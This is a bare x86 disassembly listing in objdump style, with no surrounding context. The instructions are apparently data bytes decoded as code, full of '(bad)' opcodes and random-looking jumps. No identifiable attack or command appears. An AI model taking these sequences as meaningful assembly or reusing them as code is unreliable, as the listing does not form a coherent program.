  41e739:	adc    al,0x76
  41e73b:	dec    eax
  41e73c:	adc    ch,ah
  41e73e:	sbb    DWORD PTR [edi+0x1a],esp
  41e741:	dec    edi
  41e742:	jmp    0x41e71e
  41e744:	ins    BYTE PTR es:[edi],dx
  41e745:	(bad)  
  41e746:	bound  esp,QWORD PTR [ebx]
  41e748:	repnz shl bl,0xa5
  41e74c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e74d:	jnp    0x41e78e
  41e74f:	push   es
  41e750:	rol    DWORD PTR [ebp-0xa],1
  41e753:	mov    eax,0xdcbfa180
  41e758:	repnz jmp 0x981:0xa7f61721
  41e760:	pop    es
  41e761:	mov    ds:0x54a6e56e,eax
  41e766:	xor    al,ch
  41e768:	cmc    
  41e769:	out    dx,eax
  41e76a:	sub    DWORD PTR [esi+0x554e5170],esp
  41e770:	js     0x41e7a8
  41e772:	inc    eax
  41e773:	sbb    dl,ch
  41e775:	pushf  
  41e776:	sbb    DWORD PTR [eax+eiz*2],esi
  41e779:	sahf   
  41e77a:	fdivr  DWORD PTR [edi]
  41e77c:	xchg   ah,bh
  41e77e:	push   esi
  41e77f:	mov    eax,0x3812c3d1
  41e784:	ret    
  41e785:	sub    DWORD PTR ds:0x3af1dce1,0x35e1b436
  41e78f:	jmp    0x41e7d0
  41e791:	inc    ecx
  41e792:	es pop eax
  41e794:	dec    ecx
  41e795:	adc    edi,edx
  41e797:	(bad)  
  41e798:	mov    ch,0x20
  41e79a:	adc    ecx,edx
  41e79c:	xor    eax,esi
  41e79e:	dec    edi
  41e79f:	scas   eax,DWORD PTR es:[edi]
  41e7a0:	jecxz  0x41e80d
  41e7a2:	loope  0x41e76c
  41e7a4:	loop   0x41e75b
  41e7a6:	cli    
  41e7a7:	xlat   BYTE PTR ds:[ebx]
  41e7a8:	and    esi,edx
  41e7aa:	fs push 0x4
  41e7ad:	jmp    ecx
  41e7af:	sub    ah,BYTE PTR [eax+0x27fd1474]
  41e7b5:	pushf  
  41e7b6:	pop    edi
  41e7b7:	jmp    0x7903:0xf22284e4
  41e7be:	xchg   esp,eax
  41e7bf:	xor    bl,BYTE PTR [ebp-0x4]
  41e7c2:	adc    DWORD PTR [eax-0x7e],ebp
  41e7c5:	and    al,0x5f
  41e7c7:	arpl   WORD PTR ds:0x3388238,cx
  41e7cd:	repz mov cl,0x86
  41e7d0:	leave  
  41e7d1:	mov    ebx,0x7ad986d3
  41e7d6:	ja     0x41e7be
  41e7d8:	addr16 add eax,esi
  41e7db:	and    eax,0xfa52759f
  41e7e0:	scas   al,BYTE PTR es:[edi]
  41e7e1:	retf   0xeb01
  41e7e4:	pop    ss
  41e7e5:	pop    es
  41e7e6:	test   DWORD PTR [edx+0x142b96b8],ebp
  41e7ec:	sbb    DWORD PTR [edi+0x4cca130c],ecx
  41e7f2:	inc    ebp
  41e7f3:	sahf   
  41e7f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7f5:	ins    BYTE PTR es:[edi],dx
  41e7f6:	push   ss
  41e7f7:	mov    ebp,0x1bce730e
  41e7fc:	dec    eax
  41e7fd:	mov    ss,WORD PTR [eax]
  41e7ff:	jo     0x41e7d0
  41e801:	call   DWORD PTR ds:0x185b650c
  41e808:	push   edx
  41e809:	(bad)  
  41e80a:	daa    
  41e80b:	jle    0x41e7a4
  41e80d:	push   0xfffffff9
  41e80f:	cmp    ecx,esp
  41e811:	in     eax,dx
  41e812:	add    BYTE PTR [edx],bl
  41e814:	jge    0x41e88a
  41e816:	sub    esi,esi
  41e818:	sti    
  41e819:	inc    esi
  41e81a:	push   0x585c6615
  41e81f:	jbe    0x41e844
  41e821:	clc    
  41e822:	retf   
  41e823:	dec    ebx
  41e824:	cwde   
  41e825:	pmaxub mm7,mm5
  41e828:	fs mov ebx,edi
  41e82b:	xchg   esp,eax
  41e82c:	fiadd  WORD PTR [ebp-0x4acfcf2a]
  41e832:	and    al,ch
  41e834:	xchg   esi,eax
  41e835:	sahf   
  41e836:	nop
  41e837:	sbb    ebp,edx
  41e839:	test   BYTE PTR ds:0x30abfb6b,bl
  41e83f:	mov    eax,ds:0xb0a7b877
  41e844:	pop    es
  41e845:	lods   eax,DWORD PTR ds:[esi]
  41e846:	mov    cl,0xa4
  41e848:	cdq    
  41e849:	rcr    DWORD PTR [ebx-0x9],0xc3
  41e84d:	(bad)  
  41e84e:	sub    edx,ebp
  41e850:	mov    dh,0x3e
  41e852:	sahf   
  41e853:	in     eax,dx
  41e854:	mov    BYTE PTR [ebx+edi*8],ch
  41e857:	push   cs
  41e858:	mov    DWORD PTR [ebx+0x2f2e8595],ebx
  41e85e:	enter  0x95e3,0xb3
  41e862:	psubw  mm5,QWORD PTR [edx]
  41e865:	dec    esi
  41e866:	test   al,0x32
  41e868:	ret    0x9933
  41e86b:	mov    cl,0x9c
  41e86d:	jecxz  0x41e835
  41e86f:	push   DWORD PTR [edi-0x1b41bd0d]
  41e875:	in     eax,0xf
  41e877:	mov    eax,0x8c2c7af5
  41e87c:	cdq    
  41e87d:	lahf   
  41e87e:	cmp    esi,ebx
  41e880:	sbb    BYTE PTR [eax-0x63],0x60
  41e884:	xchg   ebp,eax
  41e885:	push   ecx
  41e886:	stos   BYTE PTR es:[edi],al
  41e887:	xor    BYTE PTR [ecx+0x2],ah
  41e88a:	dec    edi
  41e88b:	test   BYTE PTR [esi-0x4879718e],0xcb
  41e892:	shl    DWORD PTR [edx+ecx*4-0x19],cl
  41e896:	enter  0xbc50,0xc9
  41e89a:	xchg   ebp,eax
  41e89b:	out    0xf,al
  41e89d:	mov    ebx,0xe0f5be13
  41e8a2:	sub    esi,DWORD PTR [ebp-0x60]
  41e8a5:	xchg   edi,eax
  41e8a6:	popa   
  41e8a7:	(bad)  
  41e8a8:	sub    dh,BYTE PTR [edi+ecx*2-0x6a168794]
  41e8af:	popa   
  41e8b0:	lahf   
  41e8b1:	adc    eax,0x4bb76378
  41e8b6:	inc    edx
  41e8b7:	out    dx,eax
  41e8b8:	mov    edx,0x4dafa80e
  41e8bd:	pop    edx
  41e8be:	sbb    eax,0xba1d31ba
  41e8c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8c4:	mov    ah,cl
  41e8c6:	pop    edx
  41e8c7:	icebp  
  41e8c8:	clc    
  41e8c9:	mov    eax,ds:0x5fe9fe08
  41e8ce:	pop    esi
  41e8cf:	(bad)  
  41e8d0:	add    eax,0x5fcd25cc
  41e8d5:	jmp    0x41e8e0
  41e8d7:	and    DWORD PTR [eax+0x76],esi
  41e8da:	ret    0x30c5
  41e8dd:	scas   eax,DWORD PTR es:[edi]
  41e8de:	xchg   edx,eax
  41e8df:	and    ah,bl
  41e8e1:	outs   dx,DWORD PTR ds:[esi]
  41e8e2:	mov    edx,0x58e8ed8f
  41e8e7:	ins    DWORD PTR es:[edi],dx
  41e8e8:	and    bh,dh
  41e8ea:	or     eax,DWORD PTR [esi-0x14109f6b]
  41e8f0:	mov    bh,0x5f
  41e8f2:	aas    
  41e8f3:	cmp    DWORD PTR [ebp+0x48],0x84d430d
  41e8fa:	push   edx
  41e8fb:	ss into 
  41e8fd:	mov    ah,bl
  41e8ff:	pop    ss
  41e900:	inc    esi
  41e901:	scas   al,BYTE PTR es:[edi]
  41e902:	xchg   ebx,eax
  41e903:	loopne 0x41e8b1
  41e905:	push   edi
  41e906:	add    eax,DWORD PTR [eax-0x7936d4cb]
  41e90c:	add    eax,0x6739410c
  41e911:	out    dx,al
  41e912:	push   esi
  41e913:	cmp    eax,0xa554259a
  41e918:	std    
  41e919:	mov    DWORD PTR [ebp+ecx*4-0x1e9a4537],esp
  41e920:	fidiv  WORD PTR [ebp-0x45cf4513]
  41e926:	leave  
  41e927:	sub    DWORD PTR [esi+0x618e5a27],edi
  41e92d:	or     al,0xea
  41e92f:	adc    edi,DWORD PTR [edx]
  41e931:	das    
  41e932:	and    eax,0xd6f68ec2
  41e938:	inc    ecx
  41e939:	mov    esi,0x325863fa
  41e93e:	les    ecx,FWORD PTR [edx+0x71]
  41e941:	dec    eax
  41e942:	xor    edi,DWORD PTR ds:0x9d13ebd5
  41e948:	popa   
  41e949:	(bad)  
  41e94a:	fisttp WORD PTR [esi-0x3f65cffb]
  41e950:	xchg   esp,eax
  41e951:	xchg   esp,eax
  41e952:	rcl    BYTE PTR [ecx],0x2f
  41e955:	lds    ebx,FWORD PTR ds:0xda2b7a02
  41e95b:	shr    esi,1
  41e95d:	mov    dl,0x92
  41e95f:	sub    bh,dl
  41e961:	push   ss
  41e962:	nop
  41e963:	and    eax,0x43303d9f
  41e968:	xlat   BYTE PTR ds:[ebx]
  41e969:	push   es
  41e96a:	popa   
  41e96b:	add    eax,0x2d1f517f
  41e970:	mov    al,0x41
  41e972:	daa    
  41e973:	in     eax,dx
  41e974:	fwait
  41e975:	cld    
  41e976:	jne    0x41e9ed
  41e978:	sbb    al,0x79
  41e97a:	or     BYTE PTR [esi-0x32864e28],dl
  41e980:	xchg   ebp,eax
  41e981:	push   ebp
  41e982:	xor    ecx,DWORD PTR [esp+edx*8]
  41e985:	xchg   edi,eax
  41e986:	dec    eax
  41e987:	push   0x3
  41e989:	pop    eax
  41e98a:	jmp    0x41e9cb
  41e98c:	nop
  41e98d:	and    DWORD PTR [ecx],eax
  41e98f:	mov    bl,0xba
  41e991:	dec    edi
  41e992:	inc    ecx
  41e993:	push   ds
  41e994:	bound  ebx,QWORD PTR [eax+ecx*1-0x1f0f9daa]
  41e99b:	in     eax,0x9d
  41e99d:	inc    ecx
  41e99e:	fnstcw WORD PTR [edx+0x1]
  41e9a1:	imul   edi,ebx,0x32050a68
  41e9a7:	cld    
  41e9a8:	data16 sub BYTE PTR [edi-0x79],dl
  41e9ac:	dec    edi
  41e9ad:	xor    cl,BYTE PTR [ebx]
  41e9af:	jbe    0x41ea0f
  41e9b1:	sbb    ecx,ecx
  41e9b3:	int    0xb0
  41e9b5:	into   
  41e9b6:	ins    DWORD PTR es:[edi],dx
  41e9b7:	(bad)  
  41e9b8:	dec    eax
  41e9b9:	pop    ds
  41e9ba:	mov    ebp,0x4ce7d2a8
  41e9bf:	fst    QWORD PTR [esi-0x6beee2e]
  41e9c5:	or     DWORD PTR [ebx+ebx*2-0x588954b5],eax
  41e9cc:	sti    
  41e9cd:	mov    dl,0x3b
  41e9cf:	fs out dx,al
  41e9d1:	mov    ecx,0x9f955b59
  41e9d6:	fisubr DWORD PTR [eax-0x6d]
  41e9d9:	and    esi,ebx
  41e9db:	scas   eax,DWORD PTR es:[edi]
  41e9dc:	sub    BYTE PTR [edi-0x777b3564],cl
  41e9e2:	ins    DWORD PTR es:[edi],dx
  41e9e3:	xchg   BYTE PTR [edx+eax*8-0x1b],cl
  41e9e7:	dec    ebx
  41e9e8:	fidivr WORD PTR [esi]
  41e9ea:	mov    dh,BYTE PTR [esi+edi*8-0x56]
  41e9ee:	adc    ebp,DWORD PTR [ebx-0x7eb1762a]
  41e9f4:	and    BYTE PTR [eax],bl
  41e9f6:	sbb    BYTE PTR [eax+0x562becde],ch
  41e9fc:	and    BYTE PTR [edx],0x39
  41e9ff:	xchg   ecx,eax
  41ea00:	adc    eax,0x66e29922
  41ea05:	pusha  
  41ea06:	(bad)  
  41ea07:	adc    DWORD PTR [edx-0x3931fea4],ebp
  41ea0d:	stos   BYTE PTR es:[edi],al
  41ea0e:	sbb    dl,BYTE PTR [ebp-0x79]
  41ea11:	xchg   edx,eax
  41ea12:	lds    eax,FWORD PTR cs:[edx-0x31]
  41ea16:	xchg   ebx,eax
  41ea17:	push   eax
  41ea18:	(bad)  
  41ea19:	cld    
  41ea1a:	add    ah,BYTE PTR [esi+0x572c8c2f]
  41ea20:	je     0x41e9a9
  41ea22:	fcom   DWORD PTR [esi+ebx*4-0x46]
  41ea26:	fcom   QWORD PTR [edx+0x1115e455]
  41ea2c:	add    ch,BYTE PTR [ebx-0x52]
  41ea2f:	sub    al,0x92
  41ea31:	or     eax,0xe2584991
  41ea36:	mov    eax,0xafab16a9
  41ea3b:	mov    edx,0x46e6ef24
  41ea40:	and    al,0x39
  41ea42:	scas   al,BYTE PTR es:[edi]
  41ea43:	repnz push esi
  41ea45:	and    ecx,DWORD PTR [ecx-0x6b]
  41ea48:	push   ds
  41ea49:	jo     0x41e9d2
  41ea4b:	ficomp DWORD PTR [edx]
  41ea4d:	clc    
  41ea4e:	inc    ecx
  41ea4f:	aam    0x4e
  41ea51:	sub    cl,BYTE PTR [ebx-0x67a42c0]
  41ea57:	jge    0x41ea75
  41ea59:	mov    cl,0x2e
  41ea5b:	sbb    eax,0x185757f6
  41ea60:	lahf   
  41ea61:	test   DWORD PTR [ebp-0xca60ee5],edi
  41ea67:	nop    DWORD PTR [ebx+edx*1-0x677c7250]
  41ea6f:	mov    ch,BYTE PTR [ebx-0x632b87e6]
  41ea75:	pop    ebx
  41ea76:	popa   
  41ea77:	xchg   ebx,eax
  41ea78:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41ea7a:	sub    bl,BYTE PTR [eax]
  41ea7c:	sar    ecx,1
  41ea7e:	cmc    
  41ea7f:	out    0x1b,eax
  41ea81:	shl    dh,cl
  41ea83:	push   0xffffffde
  41ea85:	data16 jg 0x41eaa2
  41ea88:	push   edx
  41ea89:	jmp    0x41ea27
  41ea8b:	arpl   WORD PTR [ebx-0x50a7dc00],bp
  41ea91:	arpl   WORD PTR [edi-0x7af79335],di
  41ea97:	xor    dh,0x99
  41ea9a:	mov    ds:0x14b3d599,al
  41ea9f:	mov    eax,0x433d85de
  41eaa4:	xchg   esi,eax
  41eaa5:	sbb    esp,DWORD PTR [edx+edi*2+0x74]
  41eaa9:	or     al,0xf5
  41eaab:	hlt    
  41eaac:	es sbb al,0x12
  41eaaf:	mov    eax,0x35977bba
  41eab4:	(bad)  
  41eab5:	leave  
  41eab6:	mov    eax,ds:0x4215bb68
  41eabb:	mov    ds:0x56ccae0,al
  41eac0:	fdiv   DWORD PTR [eax]
  41eac2:	or     ebx,ecx
  41eac4:	loopne 0x41eb09
  41eac6:	(bad)  
  41eac7:	int3   
  41eac8:	jbe    0x41eb39
  41eaca:	retf   
  41eacb:	add    DWORD PTR [ecx+0x2c],ecx
  41eace:	in     al,0x48
  41ead0:	push   es
  41ead1:	jg     0x41ea5b
  41ead3:	or     dl,BYTE PTR [esi-0x107a35a2]
  41ead9:	pop    ds
  41eada:	fcomp  QWORD PTR [ebx+0x59]
  41eadd:	add    bh,BYTE PTR [eax]
  41eadf:	ins    BYTE PTR es:[edi],dx
  41eae0:	fisttp DWORD PTR [esi]
  41eae2:	into   
  41eae3:	rcr    BYTE PTR ds:0xeb189d69,0xa4
  41eaea:	call   0xebe9:0x40ee21f
  41eaf1:	jo     0x41eac1
  41eaf3:	pop    esp
  41eaf4:	or     eax,0x7f7bf126
  41eaf9:	rol    bh,cl
  41eafb:	add    DWORD PTR [edi-0x16],esp
  41eafe:	jecxz  0x41eb1b
  41eb00:	arpl   WORD PTR [edi-0x74b09be0],dx
  41eb06:	les    ebx,FWORD PTR [edx]
  41eb08:	cmp    al,0xfb
  41eb0a:	mov    ds:0x588cc1b3,eax
  41eb0f:	push   esp
  41eb10:	daa    
  41eb11:	or     eax,0x27ae35e9
  41eb16:	push   eax
  41eb17:	inc    edx
  41eb18:	add    DWORD PTR [ecx+0x4b],ebp
  41eb1b:	cmp    BYTE PTR [esi+edi*2],al
  41eb1e:	les    esi,FWORD PTR [eax-0x126dd994]
  41eb24:	enter  0x8ab3,0xbe
  41eb28:	sbb    edi,esp
  41eb2a:	jp     0x41eb0b
  41eb2c:	in     eax,0x34
  41eb2e:	cmp    BYTE PTR [ebx-0x6e],dl
  41eb31:	inc    ebp
  41eb32:	fwait
  41eb33:	push   0x51
  41eb35:	jmp    0xd3c1eb3b
  41eb3a:	sbb    al,0xe1
  41eb3c:	sub    eax,0x97f4355
  41eb41:	cmp    bl,cl
  41eb43:	shr    DWORD PTR [edx+0x75],cl
  41eb46:	in     al,0x9b
  41eb48:	aaa    
  41eb49:	in     al,dx
  41eb4a:	push   edi
  41eb4b:	das    
  41eb4c:	push   ss
  41eb4d:	mov    edi,0xae4709b3
  41eb52:	mov    ds,WORD PTR [ecx-0x62291913]
  41eb58:	mov    eax,0x36c63350
  41eb5d:	inc    edx
  41eb5e:	(bad)  
  41eb5f:	stos   DWORD PTR es:[edi],eax
  41eb60:	adc    cl,BYTE PTR [edx-0xc8ef059]
  41eb66:	call   0x70e6:0x313adf36
  41eb6d:	repz xor ecx,DWORD PTR [ecx]
  41eb70:	stos   BYTE PTR es:[edi],al
  41eb71:	hlt    
  41eb72:	popa   
  41eb73:	fwait
  41eb74:	ins    BYTE PTR es:[edi],dx
  41eb75:	sub    BYTE PTR [ecx],0x9b
  41eb78:	addr16 out dx,eax
  41eb7a:	and    eax,0x517a0225
  41eb7f:	aaa    
  41eb80:	jge    0x41eb73
  41eb82:	push   ss
  41eb83:	sub    edx,DWORD PTR ds:0xac721073
  41eb89:	sbb    al,0xf3
  41eb8b:	js     0x41eb32
  41eb8d:	mov    ebp,0x5a2e7a5b
  41eb92:	add    cl,ah
  41eb94:	das    
  41eb95:	jns    0x41ebf8
  41eb97:	ror    dh,0xd1
  41eb9a:	cwde   
  41eb9b:	icebp  
  41eb9c:	xchg   esp,eax
  41eb9d:	dec    esp
  41eb9e:	jmp    0xd15c:0x5636f088
  41eba5:	pushf  
  41eba6:	outs   dx,BYTE PTR fs:[esi]
  41eba8:	sub    al,0xe9
  41ebaa:	addr16 pop ebx
  41ebac:	stos   DWORD PTR es:[edi],eax
  41ebad:	push   0xfffffffe
  41ebaf:	stos   BYTE PTR es:[edi],al
  41ebb0:	(bad)  
  41ebb1:	out    dx,eax
  41ebb2:	cmp    BYTE PTR [ebx-0x387bbd8c],dl
  41ebb8:	mul    DWORD PTR [ecx+0x58]
  41ebbb:	lahf   
  41ebbc:	retf   
  41ebbd:	cmp    edi,DWORD PTR [edi]
  41ebbf:	mov    edx,0x61fe9b16
  41ebc4:	sbb    BYTE PTR [esi],bl
  41ebc6:	adc    DWORD PTR [esi+0x4c0038cd],edi
  41ebcc:	jle    0x41ec16
  41ebce:	dec    esp
  41ebcf:	mov    al,ds:0xac46f9d9
  41ebd4:	mov    ds:0x69b12e41,al
  41ebd9:	mul    BYTE PTR [ebx+0x673c7b13]
  41ebdf:	js     0x41ec35
  41ebe1:	xchg   edx,eax
  41ebe2:	mov    ds:0x2c4f92f1,al
  41ebe7:	retf   
  41ebe8:	mov    DWORD PTR [ebx],edx
  41ebea:	mov    al,0x4e
  41ebec:	inc    esp
  41ebed:	repnz or DWORD PTR [ebp-0x7b],ebx
  41ebf1:	ja     0x41ebe0
  41ebf3:	inc    eax
  41ebf4:	repnz mov edx,0x2475d037
  41ebfa:	iret   
  41ebfb:	jge    0x41ebd0
  41ebfd:	add    eax,0x41d67fbd
  41ec02:	push   edx
  41ec03:	retf   0x75c8
  41ec06:	in     eax,0xf7
  41ec08:	cwde   
  41ec09:	in     al,dx
  41ec0a:	ror    BYTE PTR [edx],1
  41ec0c:	loop   0x41ec8d
  41ec0e:	loope  0x41ebed
  41ec10:	jmp    0xc393:0xb2c38ec1
  41ec17:	jns    0x41ec7e
  41ec19:	mov    cl,0xee
  41ec1b:	jmp    0x1b9129f7
  41ec20:	sub    ch,BYTE PTR [edi-0x62]
  41ec23:	cwde   
  41ec24:	shr    ah,0xd6
  41ec27:	inc    esi
  41ec28:	or     edx,DWORD PTR [ebp+0x23]
  41ec2b:	ret    
  41ec2c:	enter  0x5489,0x48
  41ec30:	scas   al,BYTE PTR es:[edi]
  41ec31:	fwait
  41ec32:	dec    edx
  41ec33:	mov    ecx,DWORD PTR [edi-0x34]
  41ec36:	rcr    DWORD PTR [ecx+0x26e2654a],0x26
  41ec3d:	icebp  
  41ec3e:	adc    eax,0x3949bb85
  41ec43:	mov    dl,al
  41ec45:	cs pop esi
  41ec47:	mov    ebx,0xfddf4c
  41ec4c:	jge    0x41ec35
  41ec4e:	cmc    
  41ec4f:	iret   
  41ec50:	add    al,0x5f
  41ec52:	xor    ebp,DWORD PTR [eax]
  41ec54:	frstor [edx+0x60]
  41ec57:	mov    eax,ds:0x39c19bb3
  41ec5c:	lods   eax,DWORD PTR ds:[esi]
  41ec5d:	rol    DWORD PTR [edx-0x533d68ae],0x99
  41ec64:	pusha  
  41ec65:	data16 or BYTE PTR [ecx],ch
  41ec68:	pop    ss
  41ec69:	and    bl,bh
  41ec6b:	fidivr WORD PTR ds:0xbafdbb9e
  41ec71:	cmp    al,0x63
  41ec73:	or     eax,0x9ee7c9f
  41ec78:	jnp    0x41ecf3
  41ec7a:	popa   
  41ec7b:	inc    edi
  41ec7c:	stos   BYTE PTR es:[edi],al
  41ec7d:	add    BYTE PTR ds:0x151e4869,0x22
  41ec84:	push   ds
  41ec85:	aaa    
  41ec86:	scas   eax,DWORD PTR es:[edi]
  41ec87:	sub    ecx,esp
  41ec89:	cmp    bl,BYTE PTR [ebp-0x4d15e7a5]
  41ec8f:	retf   
  41ec90:	mov    ah,0x96
  41ec92:	arpl   WORD PTR [esi],sp
  41ec94:	popf   
  41ec95:	mov    ebp,0xddbc5d0f
  41ec9a:	push   esi
  41ec9b:	sahf   
  41ec9c:	arpl   si,cx
  41ec9e:	xor    edi,DWORD PTR [ebx+0x4167c6e4]
  41eca4:	in     eax,0x54
  41eca6:	sbb    bh,dh
  41eca8:	and    eax,0x1ad06346
  41ecad:	stc    
  41ecae:	push   ecx
  41ecaf:	icebp  
  41ecb0:	xchg   esi,eax
  41ecb1:	aaa    
  41ecb2:	jns    0x41ecd7
  41ecb4:	lahf   
  41ecb5:	adc    al,0x9f
  41ecb7:	retf   
  41ecb8:	mov    esp,0x136e714c
  41ecbd:	mov    eax,ds:0x6114ca8d
  41ecc2:	xchg   BYTE PTR [edx+0x15],dl
  41ecc5:	iret   
  41ecc6:	ins    DWORD PTR es:[edi],dx
  41ecc7:	xchg   esi,eax
  41ecc8:	into   
  41ecc9:	mov    ebp,0x8f1df4b6
  41ecce:	or     ch,al
  41ecd0:	nop
  41ecd1:	cs or  edi,0xef4ea025
  41ecd8:	out    0x2c,eax
  41ecda:	mov    edi,0x93a830b5
  41ecdf:	inc    ebx
  41ece0:	(bad)  
  41ece1:	leave  
  41ece2:	das    
  41ece3:	arpl   WORD PTR [edi+0x153a22a6],cx
  41ece9:	jb     0x41ece3
  41eceb:	mov    dl,0xd4
  41eced:	and    eax,0xed57b9b7
  41ecf2:	out    0xb8,eax
  41ecf4:	inc    ebx
  41ecf5:	fisubr DWORD PTR [ebx+esi*8]
  41ecf8:	rcl    DWORD PTR [ebp+0x4bbabf64],0x5a
  41ecff:	mov    ds:0x68679ad1,eax
  41ed04:	adc    dh,BYTE PTR [eax-0x21]
  41ed07:	pushf  
  41ed08:	int3   
  41ed09:	and    ah,BYTE PTR [ecx-0xce4685e]
  41ed0f:	push   ds
  41ed10:	xor    edx,ebx
  41ed12:	adc    dh,BYTE PTR [ebx]
  41ed14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed15:	pop    edx
  41ed16:	enter  0x21f9,0x34
  41ed1a:	pop    ebp
  41ed1b:	retf   0xab95
  41ed1e:	int3   
  41ed1f:	cdq    
  41ed20:	mov    bh,0xab
  41ed22:	cmp    eax,0x2ed23dc1
  41ed27:	out    dx,eax
  41ed28:	or     bl,BYTE PTR [edi+ecx*1+0x58448717]
  41ed2f:	aam    0xe1
  41ed31:	or     cl,BYTE PTR [ebp-0x7ead6f95]
  41ed37:	fidiv  DWORD PTR [esi+edi*1-0x2]
  41ed3b:	mov    dl,0x47
  41ed3d:	xchg   ebx,eax
  41ed3e:	cwde   
  41ed3f:	lds    ecx,FWORD PTR [ecx+0x42]
  41ed42:	push   ebx
  41ed43:	repnz pop es
  41ed45:	(bad)  
  41ed46:	stc    
  41ed47:	in     eax,dx
  41ed48:	mov    esp,0xa95a639b
  41ed4d:	fldcw  WORD PTR [ebp+0x57426859]
  41ed53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed54:	xlat   BYTE PTR ds:[ebx]
  41ed55:	loop   0x41edba
  41ed57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed58:	lods   eax,DWORD PTR ds:[esi]
  41ed59:	cdq    
  41ed5a:	mov    cl,0xeb
  41ed5c:	push   edi
  41ed5d:	xor    ebp,edx
  41ed5f:	sbb    BYTE PTR [ebp-0x72],ch
  41ed62:	jecxz  0x41ed40
  41ed64:	int3   
  41ed65:	push   esp
  41ed66:	inc    ebp
  41ed67:	inc    ecx
  41ed68:	data16 jb 0x41edc7
  41ed6b:	stc    
  41ed6c:	dec    BYTE PTR [ecx]
  41ed6e:	addr16 jo 0x41ecff
  41ed71:	push   ebx
  41ed72:	aad    0xd1
  41ed74:	mov    ds:0xaf85ad1b,eax
  41ed79:	cmp    eax,0xbc2b749
  41ed7e:	inc    eax
  41ed7f:	cli    
  41ed80:	dec    ebp
  41ed81:	ret    0x213
  41ed84:	sub    al,0x5f
  41ed86:	cmp    eax,DWORD PTR [ecx-0x1ae9d946]
  41ed8c:	cli    
  41ed8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed8e:	xlat   BYTE PTR ds:[ebx]
  41ed8f:	mov    eax,ds:0xd2e8be17
  41ed94:	call   0x799b88db
  41ed99:	jnp    0x41edfc
  41ed9b:	cdq    
  41ed9c:	mov    ds:0x6a9e21eb,eax
  41eda1:	iret   
  41eda2:	push   edx
  41eda3:	cmp    dl,0x36
  41eda6:	mov    esi,0xe067c86d
  41edab:	jnp    0x41ed8b
  41edad:	push   esp
  41edae:	xchg   BYTE PTR [esi-0x473dc993],bh
  41edb4:	sbb    ah,ch
  41edb6:	and    ch,BYTE PTR [ebx+0x67818431]
  41edbc:	mov    ah,0xc4
  41edbe:	cmp    eax,eax
  41edc0:	lea    edx,[eax]
  41edc2:	les    edi,FWORD PTR [edi-0x60cc587]
  41edc8:	test   DWORD PTR ds:0xb5da0f97,ecx
  41edce:	inc    eax
  41edcf:	inc    esp
  41edd0:	(bad)  
  41edd1:	adc    eax,0x1aed0629
  41edd6:	add    ecx,eax
  41edd8:	sbb    ecx,DWORD PTR [ecx+0x31e1fa8]
  41edde:	mov    edx,0x34cb55f5
  41ede3:	dec    ecx
  41ede4:	jmp    0x41ee2a
  41ede6:	and    eax,0xce1cd5ba
  41edeb:	mov    dl,0xff
  41eded:	push   edi
  41edee:	in     al,0x8
  41edf0:	add    cl,BYTE PTR [ebx]
  41edf2:	pop    es
  41edf3:	adc    edi,ebp
  41edf5:	add    DWORD PTR [ecx+0x196f74b2],ecx
  41edfb:	dec    edi
  41edfc:	iret   
  41edfd:	and    al,0xa7
  41edff:	repz aas 
  41ee01:	xlat   BYTE PTR ds:[ebx]
  41ee02:	int3   
  41ee03:	mov    bh,0x25
  41ee05:	sti    
  41ee06:	cdq    
  41ee07:	cli    
  41ee08:	js     0x41edd1
  41ee0a:	xchg   ecx,eax
  41ee0b:	fwait
  41ee0c:	push   esp
  41ee0d:	jb     0x41ee17
  41ee0f:	test   al,0xe9
  41ee11:	repz pushf 
  41ee13:	jns    0x41edfd
  41ee15:	icebp  
  41ee16:	push   ss
  41ee17:	imul   DWORD PTR [eax]
  41ee19:	mov    esi,0xb78ff067
  41ee1e:	or     eax,0xd58a34d4
  41ee23:	loop   0x41ede7
  41ee25:	(bad)  
  41ee26:	or     cl,BYTE PTR [eax]
  41ee28:	mov    esp,ds
  41ee2a:	test   DWORD PTR [edi],ebx
  41ee2c:	sbb    ch,BYTE PTR [edi+0x3e9605e7]
  41ee32:	pop    edi
  41ee33:	sub    dh,BYTE PTR [eax]
  41ee35:	and    al,0x93
  41ee37:	and    bl,BYTE PTR [ebx+eax*4+0x32]
  41ee3b:	into   
  41ee3c:	cmp    ebx,DWORD PTR [ebx]
  41ee3e:	dec    ecx
  41ee3f:	(bad)
  41ee43:	adc    BYTE PTR ds:0xf9988b7,0x33
  41ee4a:	fistp  QWORD PTR [ebp-0x5]
  41ee4d:	mov    ds:0xefca849c,al
  41ee52:	lds    ebp,FWORD PTR [eax]
  41ee54:	push   ecx
  41ee55:	into   
  41ee56:	inc    ecx
  41ee57:	rcl    BYTE PTR [esi],1
  41ee59:	test   al,0x7f
  41ee5b:	mov    al,0x90
  41ee5d:	cdq    
  41ee5e:	in     al,0x3e
  41ee60:	xchg   ebx,eax
  41ee61:	std    
  41ee62:	add    dl,bl
  41ee64:	in     eax,dx
  41ee65:	push   ss
  41ee66:	adc    eax,0x1220c0b2
  41ee6b:	(bad)  
  41ee6c:	lock xchg BYTE PTR [esp+edi*1+0x50],cl
  41ee71:	pop    ss
  41ee72:	dec    edx
  41ee73:	pop    esp
  41ee74:	in     al,0x83
  41ee76:	jle    0x41eee9
  41ee78:	inc    edi
  41ee79:	les    esp,FWORD PTR [ebx-0x1d4ae36]
  41ee7f:	in     eax,dx
  41ee80:	mov    edx,0x487599a9
  41ee85:	fimul  DWORD PTR [ecx]
  41ee87:	or     ebp,DWORD PTR [ebp+0x6f]
  41ee8a:	mov    WORD PTR [esi-0x33],?
  41ee8d:	test   al,0x8
  41ee8f:	and    DWORD PTR [ecx+0x3f],ebp
  41ee92:	sub    ah,dl
  41ee94:	pop    eax
  41ee95:	dec    ebp
  41ee96:	xor    ebp,ebx
  41ee98:	mov    ecx,0x9e819192
  41ee9d:	shr    BYTE PTR [esi+0x56df0cc0],cl
  41eea3:	(bad)  
  41eea4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
